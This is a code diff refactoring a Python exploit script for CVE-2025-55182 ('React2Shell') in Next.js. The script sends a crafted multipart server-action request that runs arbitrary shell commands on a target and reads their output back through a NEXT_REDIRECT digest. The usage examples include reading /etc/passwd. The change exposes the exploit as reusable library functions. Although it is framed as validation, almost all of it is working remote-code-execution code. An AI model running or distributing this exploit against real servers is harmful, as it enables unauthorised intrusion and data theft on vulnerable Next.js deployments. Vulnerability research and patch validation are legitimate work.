@@ -16,6 +16,10 @@ Examples:
     python3 validate-react2shell.py http://localhost:7777 id
     python3 validate-react2shell.py http://localhost:7777 "cat /etc/hostname"
     python3 validate-react2shell.py http://TARGET:7777 "cat /etc/passwd"
+
+The payload builder and command runner are exposed as module-level functions
+(build_payload, send_payload, parse_digest, run_command) so other tooling can
+reuse the same proven exploit path without duplicating it.
 """
 import json
 import re
@@ -24,16 +28,7 @@ import sys
 try:
     import requests
 except ImportError:
-    print("[!] Python 'requests' library required: pip3 install requests")
-    sys.exit(1)
-
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:7777"
-COMMAND = sys.argv[2] if len(sys.argv) > 2 else "id"
-
-print("[*] CVE-2025-55182 (React2Shell) Exploit Validation")
-print("[*] Target: %s" % TARGET)
-print("[*] Command: %s" % COMMAND)
-print()
+    requests = None
 
 
 def escape_for_js(cmd):
@@ -62,8 +57,8 @@ def build_payload(cmd):
     }
 
 
-def send_payload(payload):
-    body = (
+def build_body(payload):
+    return (
         '------Boundary\r\n'
         'Content-Disposition: form-data; name="0"\r\n'
         '\r\n'
@@ -74,51 +69,92 @@ def send_payload(payload):
         '"$@0"\r\n'
         '------Boundary--'
     ) % json.dumps(payload)
+
+
+def send_payload(target_url, payload, timeout=10):
+    if requests is None:
+        raise RuntimeError("requests library required")
+    body = build_body(payload)
     headers = {
         "Next-Action": "x",
         "Content-Type": "multipart/form-data; boundary=----Boundary",
     }
-    return requests.post(TARGET, data=body.encode(), headers=headers, timeout=10)
+    return requests.post(target_url, data=body.encode(), headers=headers, timeout=timeout)
 
 
-print("[*] Sending NEXT_REDIRECT exfiltration payload...")
-print()
+def parse_digest(text):
+    """Return the exfiltrated command output from a NEXT_REDIRECT digest.
 
-payload = build_payload(COMMAND)
+    Returns None when there is no digest, when the digest could not be parsed,
+    or when the digest is a short numeric hash (which means the error fired but
+    the command output was not exfiltrated).
+    """
+    if "digest" not in text:
+        return None
+    match = re.search(r'"digest":"(.*?)"', text)
+    if not match:
+        return None
+    value = match.group(1)
+    if value.isdigit() and len(value) < 15:
+        return None
+    return value
 
-try:
-    res = send_payload(payload)
-    print("[*] Response status: %d" % res.status_code)
 
-    if "digest" in res.text:
-        digest_match = re.search(r'"digest":"(.*?)"', res.text)
-        if digest_match:
-            digest_value = digest_match.group(1)
-            if digest_value.isdigit() and len(digest_value) < 15:
-                print("[!] Digest is hashed (%s) -- error occurred but output was not exfiltrated." % digest_value)
-                print("[!] The payload may have thrown a different error.")
-                print()
-                print("[*] Response body: %s" % res.text[:500])
-            else:
-                print("[+] SUCCESS! Command output via NEXT_REDIRECT exfiltration:")
-                print("    %s" % digest_value)
-                print()
-                print("[+] CVE-2025-55182 RCE CONFIRMED")
+def run_command(target_url, command, timeout=10):
+    """Execute command on the target via CVE-2025-55182.
+
+    Returns (status_code, output, raw_text) where output is the exfiltrated
+    command output string, or None if exfiltration did not occur.
+    """
+    resp = send_payload(target_url, build_payload(command), timeout=timeout)
+    return resp.status_code, parse_digest(resp.text), resp.text
+
+
+def main():
+    if requests is None:
+        print("[!] Python 'requests' library required: pip3 install requests")
+        sys.exit(1)
+
+    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:7777"
+    command = sys.argv[2] if len(sys.argv) > 2 else "id"
+
+    print("[*] CVE-2025-55182 (React2Shell) Exploit Validation")
+    print("[*] Target: %s" % target)
+    print("[*] Command: %s" % command)
+    print()
+    print("[*] Sending NEXT_REDIRECT exfiltration payload...")
+    print()
+
+    try:
+        status_code, output, raw_text = run_command(target, command)
+        print("[*] Response status: %d" % status_code)
+
+        if output is not None:
+            print("[+] SUCCESS! Command output via NEXT_REDIRECT exfiltration:")
+            print("    %s" % output)
+            print()
+            print("[+] CVE-2025-55182 RCE CONFIRMED")
+        elif "digest" in raw_text:
+            print("[!] Digest present but output was not exfiltrated (hashed digest).")
+            print("[!] The payload may have thrown a different error.")
+            print()
+            print("[*] Response body: %s" % raw_text[:500])
         else:
-            print("[!] Digest field found but could not parse value")
-            print("[*] Response body: %s" % res.text[:500])
-    else:
-        print("[!] No digest in response")
-        print("[*] Response body: %s" % res.text[:500])
+            print("[!] No digest in response")
+            print("[*] Response body: %s" % raw_text[:500])
 
-except requests.exceptions.ConnectionError:
-    print("[!] Connection error (reset or refused)")
-    print("[!] Check that the target is reachable and Next.js is running on port 7777")
-except requests.exceptions.Timeout:
-    print("[!] Request timed out")
-    print("[!] The server may be processing the request -- try again")
-except Exception as e:
-    print("[!] Error: %s" % e)
+    except requests.exceptions.ConnectionError:
+        print("[!] Connection error (reset or refused)")
+        print("[!] Check that the target is reachable and Next.js is running on port 7777")
+    except requests.exceptions.Timeout:
+        print("[!] Request timed out")
+        print("[!] The server may be processing the request -- try again")
+    except Exception as e:
+        print("[!] Error: %s" % e)
 
-print()
-print("[*] Done")
+    print()
+    print("[*] Done")
+
+
+if __name__ == "__main__":
+    main()
